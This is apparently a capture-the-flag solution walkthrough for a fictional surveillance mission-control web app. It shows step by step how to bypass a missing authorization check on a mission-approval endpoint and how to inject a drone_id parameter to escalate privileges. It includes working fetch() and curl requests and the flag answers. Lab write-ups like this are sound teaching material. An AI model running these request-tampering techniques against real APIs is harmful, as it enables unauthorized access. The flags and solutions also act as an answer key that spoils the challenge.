# System Compromise - Solution Walkthrough

This challenge tests business logic vulnerabilities in a mission control system. Both flags require understanding the application architecture and manipulating workflow states.

## Prerequisites

- Web browser with Developer Tools (Chrome/Firefox recommended)
- Basic understanding of HTTP requests and JSON
- Optional: `curl` or similar tool for API testing

---

## Flag 5: Authorization Workflow Bypass

**Vulnerability**: Insecure Direct Object Reference (IDOR) + Missing Function-Level Access Control

### Step 1: Access the System

1. Navigate to the challenge URL
2. You'll see a login interface for the "Xyrathian Orbital Surveillance Network"
3. Click the "Field Operator Access" button to log in with basic privileges
4. You'll be redirected to the mission control dashboard

### Step 2: Create a Surveillance Mission

1. On the dashboard, click "New Mission" or "Create Surveillance Request"
2. Fill in the form:
   - **Target Zone**: Select any option (e.g., "North America - Sector 7")
   - **Duration**: Enter a value like 24 hours
3. Submit the mission request
4. You'll see: **"Mission #1234 created. Status: PENDING APPROVAL"**
5. A message states: "Your request has been submitted to Command for authorization"

### Step 3: Explore Mission Status

1. Click "View Details" or navigate to your mission list
2. Open **DevTools → Network tab** (F12)
3. Reload the page or click "View Details" again
4. Observe the API request:
   ```
   GET /api/mission/status/1234
   ```
5. Examine the JSON response:
   ```json
   {
     "id": 1234,
     "status": "pending",
     "target_zone": "north_america_sector_7",
     "duration_hours": 24,
     "assigned_drone_id": 7234,
     "_links": {
       "self": "/api/mission/status/1234",
       "approve": "/api/mission/approve",
       "cancel": "/api/mission/cancel"
     }
   }
   ```
6. **Key discovery**: The `_links` object reveals an `/api/mission/approve` endpoint!

### Step 4: Approve Your Own Mission

1. The UI shows a disabled "Approve Mission" button (admin-only)
2. Call the approve endpoint directly using DevTools Console:
   ```javascript
   fetch('/api/mission/approve', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({mission_id: 1234})
   })
   .then(r => r.json())
   .then(data => console.log(data))
   ```
3. The server responds:
   ```json
   {
     "success": true,
     "message": "Mission approved",
     "mission_id": 1234,
     "flag": "ATHACKCTF{unauth0r1z3d_m1ss10n_4ppr0v4l}"
   }
   ```

**Alternatively**, using curl:
```bash
curl -X POST http://challenge-url/api/mission/approve \
  -H "Content-Type: application/json" \
  -d '{"mission_id": 1234}'
```

### Step 5: Retrieve Flag 5

**Option 1**: The approval response contains the flag (see above)

**Option 2** (easier for beginners): View the mission status page
1. Navigate back to your mission details page
2. Scroll down to the "Mission Data" section (shows API response in JSON)
3. The flag appears in the JSON:
   ```json
   {
     "mission_id": 1234,
     "status": "active",
     "flag": "ATHACKCTF{unauth0r1z3d_m1ss10n_4ppr0v4l}",
     ...
   }
   ```

**Flag 5**: `ATHACKCTF{unauth0r1z3d_m1ss10n_4ppr0v4l}`

**Vulnerability Explanation**: The `/api/mission/approve` endpoint lacks authorization checks. Any user can approve any mission by knowing the mission ID, bypassing the intended workflow where only commanders should approve missions.

---

## Flag 6: Drone Clearance Escalation

**Vulnerability**: Insufficient Input Validation + Privilege Escalation via Parameter Injection

### Step 1: Understand the Drone System

1. After approving your mission, navigate to "Access Feed" or similar option
2. You'll see:
   ```
   📡 Drone #7234 Surveillance Feed
   Target: North America - Sector 7
   Coverage: Standard Resolution
   Encrypted Channels: 0/12 accessible
   ```
3. Try clicking "Switch to Encrypted Feeds" or similar option
4. You get an error:
   ```json
   {
     "error": "Feed unavailable",
     "reason": "Drone #7234 lacks cryptographic payload access",
     "authorized_units": "See fleet manifest"
   }
   ```
5. **Key insight**: Your drone doesn't have access to classified feeds

### Step 2: Explore Mission History

1. Navigate to "Recent Operations" (separate page or dashboard section)
2. Observe the mission log:
   ```
   Mission #13 | Drone #6543 | Pacific Grid 5            | Operator Krel'mok
   Mission #12 | Drone #8102 | North America Sector 7    | Operator Zix'val
   Mission #11 | Drone #56   | Arctic Sector Classified  | Commander Thon'var
   Mission #10 | Drone #42   | Europe Zone 12            | Commander Thon'var
   Mission #9  | Drone #5234 | Pacific Grid 5            | Operator Krel'mok
   ```
3. **Pattern discovery**: 
   - Commanders get two-digit drone IDs (#42, #56, #67)
   - Commanders access classified locations ("Arctic Sector Classified")
   - Operators get four-digit drone IDs (#5234, #8102, #6543)

### Step 3: Check Fleet Manifest

1. Find and click "Fleet Manifest" link (dashboard action card)
2. Review the drone listing:
   ```
   Unit #12   | Status: Active | Equipment: Full Spectrum + Crypto | Clearance: 3
   Unit #23   | Status: Active | Equipment: Full Spectrum + Crypto | Clearance: 3
   Unit #42   | Status: Active | Equipment: Full Spectrum + Crypto | Clearance: 3
   Unit #56   | Status: Active | Equipment: Full Spectrum + Crypto | Clearance: 3
   ...
   Unit #5234 | Status: Active | Equipment: Standard Optics        | Clearance: 1
   Unit #6543 | Status: Active | Equipment: Standard Optics        | Clearance: 1
   Unit #8102 | Status: Active | Equipment: Standard Optics        | Clearance: 1
   ```
3. **Conclusion**: Two-digit drones (< 100) have cryptographic access!

### Step 4: Analyze Mission Creation Request

1. Open **DevTools → Network tab**
2. Create a new mission and intercept the request
3. Observe the request payload:
   ```json
   POST /api/mission/create
   {
     "target_zone": "north_america_sector_7",
     "duration_hours": 24
   }
   ```
4. Notice the response includes:
   ```json
   {
     "mission_id": 1235,
     "assigned_drone_id": 5847,
     ...
   }
   ```
5. **Hypothesis**: The server assigns `drone_id` automatically. What if we specify it ourselves?

### Step 5: Request a High-Clearance Drone

1. Create a new mission, but modify the request to include `drone_id`:
   ```javascript
   fetch('/api/mission/create', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       target_zone: "arctic_sector_classified",
       duration_hours: 24,
       drone_id: 42
     })
   })
   .then(r => r.json())
   .then(data => console.log(data))
   ```

2. The server accepts the request:
   ```json
   {
     "mission_id": 1236,
     "assigned_drone_id": 42,
     "status": "pending"
   }
   ```
3. **Success!** You've been assigned drone #42 (a classified unit)

### Step 6: Approve and Access Classified Feed

1. Approve your new mission using the technique from Flag 5:
   ```javascript
   fetch('/api/mission/approve', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({mission_id: 1236})
   })
   .then(r => r.json())
   .then(data => console.log(data))
   ```

2. Access the surveillance feed for mission #1236
3. This time, you have access to encrypted channels:
   ```
   📡 Drone #0042 Surveillance Feed
   Target: Arctic Sector - Classified
   Coverage: Full Spectrum + Cryptographic
   Encrypted Channels: 12/12 accessible
   ```

4. Click "Access Encrypted Channel 7" or similar option
5. **Flag 6** is revealed: `ATHACKCTF{3sc4l4t3d_surv31ll4nc3_4cc3ss}`

**Vulnerability Explanation**: The mission creation endpoint accepts a `drone_id` parameter without validating whether the requesting user has authorization to use that drone. This allows privilege escalation from operator-level (civilian drones) to commander-level (classified drones) by simply specifying a restricted resource ID in the request.

---

## Key Learning Outcomes

1. **Business Logic Vulnerabilities**: Understanding how workflow bypasses differ from traditional injection attacks
2. **API Exploration**: Using browser DevTools to discover hidden endpoints through HATEOAS-style links
3. **Missing Authorization**: Recognizing when server-side checks are absent despite client-side restrictions
4. **Parameter Manipulation**: Exploiting insufficient input validation to access restricted resources
5. **Privilege Escalation**: Understanding tiered access systems and how resource assignments can be exploited
6. **Correlation Skills**: Piecing together hints from multiple sources (mission history, fleet manifest, API responses)

## Tools Used

- Browser Developer Tools (Network tab, Console)
- Optional: `curl` or Postman for API testing
- No specialized hacking tools required

